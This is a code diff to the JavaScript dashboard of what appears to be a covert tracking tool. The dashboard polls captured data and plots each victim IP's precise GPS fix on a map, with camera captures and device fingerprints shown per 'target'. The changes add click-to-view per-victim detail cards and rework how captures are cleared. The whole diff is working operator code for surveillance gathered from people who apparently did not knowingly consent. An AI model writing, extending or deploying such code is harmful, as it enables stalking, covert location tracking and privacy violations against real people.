@@ -404,8 +404,8 @@ body{{display:flex}}
     <div class="stat"><div class="n d" id="sd">0</div><div class="l">Denied</div></div>
     <div class="stat"><div class="n a" id="sa">0</div><div class="l">Devices</div></div>
   </div>
-  <div class="feed-hdr"><span>LIVE FEED</span><button class="clr" onclick="clearView()">clear view</button></div>
-  <div id="feed"><div id="empty">No captures yet.<br/>Waiting for hits…</div></div>
+  <div class="feed-hdr"><span id="feed-title">Click a dot on the map</span></div>
+  <div id="feed"><div id="empty">Click a dot on the map<br/>to see its details here.</div></div>
   <div class="status-bar" id="sbar">connecting…</div>
 </div>
 <script>
@@ -416,9 +416,8 @@ var map=null,markers={{}},seen=new Set(),stats={{g:0,d:0,a:0}},allCaptures={{}};
 function accColor(a){{return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}}
 function f(l,v){{return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}}
 function updateStats(){{document.getElementById('sg').textContent=stats.g;document.getElementById('sd').textContent=stats.d;document.getElementById('sa').textContent=stats.a;var t=stats.g+stats.d+stats.a;document.getElementById('hit-count').textContent=t+' hit'+(t===1?'':'s');}}
-function addCard(d){{
-  if(seen.has(d._id))return;seen.add(d._id);allCaptures[d._id]=d;
-  var e=document.getElementById('empty');if(e)e.remove();
+
+function buildCard(d){{
   var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
   var badge,fields='';
   var ts=d._time?new Date(d._time).toLocaleTimeString():'';
@@ -429,15 +428,9 @@ function addCard(d){{
     var lbl=acc==null?'Unknown':acc<=20?'High +/-'+acc+'m':acc<=100?'Med +/-'+acc+'m':'Low +/-'+acc+'m';
     fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A')+f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A')+f('Accuracy',acc!=null?'+/- '+acc+' m':'N/A')+f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
     fields+='<div class="f wide"><div class="lb">'+lbl+'</div><div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
-    if(map&&d.lat!=null&&d.lon!=null){{
-      var mk=L.circleMarker([d.lat,d.lon],{{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}}).addTo(map);
-      mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+'<br/>+/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');
-      markers[d._id]=mk;
-    }}
-    stats.g++;
   }}else if(isDeny){{
     badge='<span class="bx deny">Denied</span>';
-    fields+=f('Reason',d.reason);stats.d++;
+    fields+=f('Reason',d.reason);
   }}else if(ep==='/camera'){{
     if(d.denied){{
       badge='<span class="bx cam-deny">Cam Denied</span>';
@@ -459,22 +452,55 @@ function addCard(d){{
     fields+=f('Timezone',d.timezone||'N/A')+f('Cookies',d.cookieEnabled?'Enabled':'Disabled');
     if(d.gpu&&d.gpu!=='N/A')fields+='<div class="f wide"><div class="lb">GPU</div><div class="vl" style="font-size:.72rem">'+d.gpu+'</div></div>';
     if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.68rem">'+d.userAgent+'</div></div>';
-    stats.a++;
   }}
-  var div=document.createElement('div');div.className='card';div.id='card-'+d._id;
-  div.innerHTML='<div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div><div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+(isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>':'');
-  document.getElementById('feed').prepend(div);updateStats();
+  var extra=isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>':'';
+  return '<div class="card"><div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div><div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+extra+'</div>';
 }}
+
+function showForGps(gps){{
+  var ip=gps._ip;
+  // Collect all captures for this IP: the GPS + device/camera entries
+  var related=Object.values(allCaptures).filter(function(c){{return c._ip===ip;}});
+  // Sort: GPS first, then device, then camera
+  related.sort(function(a,b){{
+    var order={{'/location':0,'/info':1,'/camera':2}};
+    return (order[a._endpoint]||9)-(order[b._endpoint]||9);
+  }});
+  var html='';
+  related.forEach(function(c){{html+=buildCard(c);}});
+  document.getElementById('feed').innerHTML=html||'<div id="empty">No data for this target.</div>';
+  document.getElementById('feed-title').textContent=ip;
+}}
+
+function ingest(d){{
+  if(seen.has(d._id))return;
+  seen.add(d._id);
+  allCaptures[d._id]=d;
+  var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
+  if(isGps)stats.g++;
+  else if(isDeny)stats.d++;
+  else if(ep==='/info')stats.a++;
+  updateStats();
+  // Place marker on map for GPS captures
+  if(isGps&&map&&d.lat!=null&&d.lon!=null){{
+    var col=accColor(d.acc!=null?Math.round(d.acc):null);
+    var mk=L.circleMarker([d.lat,d.lon],{{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}}).addTo(map);
+    (function(cap){{mk.on('click',function(){{showForGps(cap);}})}})(d);
+    markers[d._id]=mk;
+  }}
+}}
+
 function setOk(ok){{document.getElementById('sbar').textContent=ok?'Connected - polling every 2s':'Lost connection...';document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';}}
-function clearView(){{seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting...</div>';stats={{g:0,d:0,a:0}};updateStats();if(map)Object.values(markers).forEach(function(m){{map.removeLayer(m);}});markers={{}};}}
-function clearAll(){{if(!confirm('Clear all captures?'))return;fetch('/api/clear',{{method:'POST'}}).then(function(){{clearView();}});}}
+function clearAll(){{if(!confirm('Clear all captures?'))return;fetch('/api/clear',{{method:'POST'}}).then(function(){{
+  seen=new Set();allCaptures={{}};stats={{g:0,d:0,a:0}};updateStats();
+  if(map)Object.values(markers).forEach(function(m){{map.removeLayer(m);}});markers={{}};
+  document.getElementById('feed').innerHTML='<div id="empty">Click a dot on the map<br/>to see its details here.</div>';
+  document.getElementById('feed-title').textContent='Click a dot on the map';
+}});}}
 function poll(){{
   fetch('/api/captures').then(function(r){{return r.json();}}).then(function(list){{
     setOk(true);
-    var newOnes=list.filter(function(c){{return !seen.has(c._id);}});
-    list.forEach(function(c){{addCard(c);}});
-    if(map&&newOnes.length===1&&newOnes[0].lat!=null){{var c=newOnes[0];map.flyTo([c.lat,c.lon],Math.min(15,Math.max(10,16-Math.log2((c.acc||500)+1))),{{animate:true,duration:1.5}});if(markers[c._id])markers[c._id].openPopup();}}
-    else if(map&&newOnes.length>1){{var gps=newOnes.filter(function(c){{return c.lat!=null;}});if(gps.length>0){{var b=L.latLngBounds(gps.map(function(c){{return[c.lat,c.lon];}}));map.fitBounds(b,{{padding:[60,60],animate:true,duration:1.0,maxZoom:13}});}}}}
+    list.forEach(function(c){{ingest(c);}});
   }}).catch(function(){{setOk(false);}});
 }}
 poll();setInterval(poll,2000);
